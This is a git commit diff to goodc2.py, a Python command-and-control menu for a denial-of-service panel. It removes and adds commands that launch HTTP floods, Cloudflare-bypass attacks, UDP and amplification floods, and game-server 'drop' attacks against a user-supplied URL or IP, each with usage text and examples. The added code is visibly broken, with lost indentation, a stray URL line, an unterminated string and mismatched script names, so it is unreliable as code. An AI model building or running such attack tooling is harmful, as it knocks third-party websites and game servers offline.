2e0e9fcf031d9a77c43aefd358d535f2c9dc79b1
JOKOP12-12 <99284952+JOKOP12-12@users.noreply.github.com>
2023-10-19 10:47:38 +0700

    Add files via upload

--- goodc2.py
+++ goodc2.py
@@ -179,17 +179,15 @@ def layer7():
     clear()
     si()
     print(f'''
-                              \x1b[38;2;0;212;14m╔═══════════════╗
-                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgoat-bypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcloudflare-uam    \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-fuzz           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnormal-bypass     \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-dstat          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass         \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mautobypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-bypass      \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m100up-bypass      \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-flood        \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-overflow       \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-get          \x1b[38;2;0;212;14m║
-               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
+               🚀𝗠𝗘𝗧𝗛𝗢𝗗𝗦  𝗟𝗔𝗬𝗘𝗥𝟳🚀
+               flood
+               mix
+               strom
+               hold
+               raw
+               socket
+               random
+                            
 ''')
 
 def layer4():
@@ -221,11 +219,10 @@ def amp_games():
 
 
 def menu():
-    sys.stdout.write(f"\x1b]2;YourC2 Net --> Stars: [{bots}] | Online Users: [1] | Methods: [25] | Bypass: [10] | Amps: [1]\x07")
+    sys.stdout.write(f"\x1b]2;YourC2 Net --> Stars: [{bots}] | Online Users: [1] | Methods: [Coming Soon] | Bypass: [10] | Amps: [1]\x07")
     clear()
-    print('\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233m1337 \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to YourC2 CnC! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mGithub: weird1337 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mNew Methods \x1b[38;2;0;255;255m+ \x1b[38;2;233;233;233mNew UI!')
-    print("")
-    print("""
+https://github.com/JOKOP12-12/YourC2     
+print("""
 ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
 ⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
 ⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
@@ -266,117 +263,51 @@ def main():
         elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
             tools()
         
-        elif "normal-bypass" in cnc:
+        elif "flood" in cnc:
             try:
                 url = cnc.split()[1]
-                time = cnc.split()[2]
-                os.system(f'node httpbypassv2.js {url} {time}')
-            except IndexError:
-                print('Usage: normal-bypass <url> <time>')
-                print('Example: normal-bypass http://example.com 20')
-
-        elif "cf-bypass" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                threads = cnc.split()[3]
-                os.system(f'node cf.js {url} {time} {threads}')
-            except IndexError:
-                print('Usage: cf-bypass <url> <time> <threads>')
-                print('Example: cf-bypass http://example-cloud.com 20 15')
-
-        elif "https-bypass" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                os.system(f'node https.js {url} {time} proxies.txt')
-            except IndexError:
-                print('Usage: https-bypass <url> <time>')
-                print('Example: https-bypass http://example.org 20')
-
-        elif "http-raw" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                method = cnc.split()[3]
-                os.system(f'node HTTP-RAW.js {url} {time} {method}')
-            except IndexError:
-                print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
-                print('Example: http-raw http://example.com 20 POST')
-
-        elif "cloudflare-uam" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                cpt = cnc.split()[3]
-                os.system(f'node uambypass.js {url} {time} {cpt} proxies.txt ')
-            except IndexError:
-                print('Usage: cloudflare-uam <url> <time> <req_per_ip>')
-                print('Example: cloudflare-uam http://example-uam.com 20 250')
-
-        elif "http-overflow" in cnc:
-            try:
-                ip = cnc.split()[1]
-                time = cnc.split()[2]
-                threads = cnc.split()[3]
-                os.system(f'./OVERFLOW {ip} {time} {threads}')
-            except IndexError:
-                print('Usage: http-overflow <ip> <time> <threads>')
-                print('Example: http-overflow 77.233.1XX.XX 30 15')
-
-        elif "http-get" in cnc:
-            try:
-                url = cnc.split()[1]
-                idk = cnc.split()[2]
-                idk1 = cnc.split()[3]
-                idk2 = cnc.split()[4]
-                os.system(f'perl httpget {url} {idk} {idk1} {idk2}')
-            except IndexError:
-                print('Usage: http-get <url> <10000> <50> <100>')
-                print('Example: http-get http://example.com 10000 50 100')
-
-        elif "http-flood" in cnc:
-            try:
-                url = cnc.split()[1]
-                threads = cnc.split()[2]
+                thread = cnc.split()[2]
                 method = cnc.split()[3]
                 time = cnc.split()[4]
-                os.system(f'./httpflood {url} {threads} {method} {time} header.txt')
+                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
             except IndexError:
-                print('Usage: http-flood <url> <threads> <get/post> <time>')
-                print('Example: http-flood http://example.com 15 post 30')
-
-        elif "100up-bypass" in cnc:
+                print('Usage: flood <url> <threads> METHODS<GET/POST> <time>')
+                print('Example: flood http://example.com 15000 get 60')
+                
+elif "hold" in cnc:
             try:
-                method = cnc.split()[1]
-                ip = cnc.split()[2]
-                port = cnc.split()[3]
+                url = cnc.split()[1]
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
                 time = cnc.split()[4]
-                connections = cnc.split()[5]
-                os.system(f'./100UP-TCP {method} {ip} {port} {time} {connections}')
+                os.system(f'go run HOLD.go {url} {thread} {method} {time} nil')
             except IndexError:
-                print('Usage: 100up-bypass <GET/POST/HEAD> <ip> <port> <time> <connections')
-                print('Example: 100up-bypass GET 77.233.1XX.XX 80 20 80000')
+                print('Usage: hold <url> <threads> METHODS<GET/POST> <time>')
+                print('Example: hold http://example.com 15000 GET 60')
 
-        elif "http-dstat" in cnc:
+elif "mix" in cnc:
             try:
                 url = cnc.split()[1]
-                connections = cnc.split()[2]
-                rps = cnc.split()[3]
-                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'go run http-mix.js {url} {thread} {method} {time} nil')
             except IndexError:
-                print('Usage: http-dstat <url> <connections> <rps>')
-                print('Example: http-dstat http://example.org 50000 50000')
+                print('Usage: mix <url> <time><threads><GET/POST/UKNOWN>)
+                print('http://example.com> <60> <30>')
 
-        elif "goat-bypass" in cnc:
+elif "socket" in cnc:
             try:
                 url = cnc.split()[1]
-                time = cnc.split()[2]
-                rps = cnc.split()[3]
-                os.system(f'node method.js {url} {time} request {rps}')
+                thread = cnc.split()[2]
+                method = cnc.split()[3]
+                time = cnc.split()[4]
+                os.system(f'go run https-socket.js  nil ')
             except IndexError:
-                print('Usage: goat-bypass <url> <time> <requests_per_second>')
-                print('Example: goat-bypass http://example-protected-org 30 450')
+                print('Usage: socket <url> <10000> <50> <100><time>')
+                print('Example: socket http-get http://example.com 10000 50 100')
+                
+                
 
         elif "geoip" in cnc:
             try:
@@ -450,153 +381,7 @@ def main():
                 print('Usage: reverse-dns <ip/domain>')
                 print('Example: reverse-dns 8.8.8.8')                
 
-        elif "http-fuzz" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                os.system(f'node httpfuzz.js {url} proxies.txt {time} POST')
-            except IndexError:
-                print(f'Usage: http-fuzz <url> <time>')
-                print("Example: http-fuzz http://sexo.org 30")
-
-        elif "autobypass" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                time = cnc.split()[3]
-                os.system(f'./AUTOBYPASS TCP {ip} {port} {time}')
-            except IndexError:
-                print('Usage: autobypass <ip> <port> <time>')
-                print('Example: autobypass 188.40.1XX.XX 80 30')
-
-        elif "http-rand" in cnc:
-            try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                os.system(f'node HTTP-RAND.js {url} {time}')
-            except IndexError:
-                print("Usage: http-rand <url> <time>")
-                print("Example: http-rand http://si.com 10")
-
-        elif 'ldap-vro' in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                threads = cnc.split()[3]
-                pps = cnc.split()[4]
-                time = cnc.split()[5]
-                os.system(f'sudo ./ldapv2 {ip} {port} ldaplist.txt {threads} {pps} {time}')
-            except IndexError:
-                print(f'Usage: ldap-vro <ip> <port> <threads> <pps> <time>')
-                print(f'Example: ldap-vro 1.1.1.1 8739 15 1024 50')
-
-        elif "ovhamp" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                os.system(f'sudo ./OVH-AMP {ip} {port}')
-            except IndexError:
-                print(f'Usage: ovhamp <ip> <port>')
-                print(f'Example: ovhamp 1.1.1.1 34264')
-
-        elif "fivem-drop" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                threads = cnc.split()[3]
-                pps = cnc.split()[4]
-                time = cnc.split()[5]
-                os.system(f'sudo ./fivem {ip} {port} fivem.txt {threads} {pps} {time}')
-            except IndexError:
-                print('Usage: fivem-drop <ip> <port> <threads> <pps> <time>')
-                print('Example: fivem-drop 1.1.1.1 30120 15 80000 30')
-
-        elif "fortnite-fly" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                threads = cnc.split()[3]
-                time = cnc.split()[4]
-                pps = cnc.split()[5]
-                os.system(f'python3 FORTNITE-FLY.py {ip} {port} {threads} {time} {pps}')
-            except IndexError:
-                print('Usage: fornite-fly <ip> <port> <threads> <time> <pps>')
-                print(f'Example: fortnite-fly 1.1.1.1 45 30 50 100000')
-
-        elif "udp-god" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                threads = cnc.split()[3]
-                throttle = cnc.split()[4]
-                time = cnc.split()[5]
-                os.system(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
-            except IndexError:
-                print(f'Usage: udp-god <ip> <port> <threads> <throttle> <time>')
-                print(f'Example: udp-god 1.1.1.1 80 30 40000 30')
-
-        elif "haven-god" in cnc:
-            try:
-                ip = cnc.split()[1]
-                time = cnc.split()[2]
-                os.system(f'sudo ./haven -d {ip} -t {time} -z 130')
-            except IndexError:
-                print('Usage: haven-god <ip> <time>')
-                print('Example: haven-god 192.168.0.1 30')
-
-        elif "telnet-god" in cnc:
-            try:
-                ip = cnc.split()[1]
-                threads = cnc.split()[2]
-                pps = cnc.split()[3]
-                time = cnc.split()[4]
-                os.system(f'sudo ./telnet {ip} {threads} {pps} {time}')
-            except IndexError:
-                print(f'Usage: telnet-god <ip> <threads> <pps> <time>')
-                print('Example: telnet-god 192.168.0.1 30 80000 50')
-
-        elif "home-god" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                psize = cnc.split()[3]
-                time = cnc.split()[4]
-                os.system(f'perl home.pl {ip} {port} {psize} {time}')
-            except IndexError:
-                print(f'Usage: home-god <ip> <port> <packet_size> <time>')
-                print(f'Example: home-god 1.1.1.1 80 1024 50')
-
-        elif "r6-drop" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                threads = cnc.split()[3]
-                pps = cnc.split()[4]
-                time = cnc.split()[5]
-                os.system(f'sudo ./R6-DROP {ip} {port} {threads} {pps} {time}')
-            except IndexError:
-                print('Usage: r6-drop <ip> <port> <threads> <pps> <time>')
-                print('Example: r6-drop 1.1.1.1 8739 20 50000 30')
-
-        elif "vse" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                threads = cnc.split()[3]
-                time = cnc.split()[4]
-                os.system(f'sudo ./vse {ip} {port} {threads} {time}')
-            except IndexError:
-                print('Usage: vse <ip> <port> <threads> <time>')
-                print('Example: vse 1.1.1.1 80 30 50')
-
-        elif "ovh-fuck" in cnc:
-            try:
-                ip = cnc.split()[1]
-                port = cnc.split()[2]
-                os.system(f'sudo ./MertOVH {ip} {port}')
-            except IndexError:
-                print('Usage: game-crash <ip> <port>')
-                print('Example: game-crash 192.168.0.1 22')
+         22')
 
         elif "cloudflare-lag" in cnc:
             print('Method "CLOUDFLARE-LAG" not enabled')
@@ -604,13 +389,14 @@ def main():
         elif "help" in cnc:
             print(f'''
                                 
-LAYER7  ► SHOW LAYER7 METHODS
+LAYER7  ► SHOW LAYER7 METHODS 
 LAYER4  ► SHOW LAYER4 METHODS
 GAME ► SHOW GAME METHODS
 RULES   ► BACA RULES YE MEMEK
 CLS ► CLS 
 PORTS ► SHOW ALL PORTS
-AMP ►AMP METHODS
+AMP ►AMP Methods
+TOOLS ►SHOW TOOLS
 CLEAR   ► CLEAR YOUR TERMINAL
 Exit ► Keluar dari tools
 
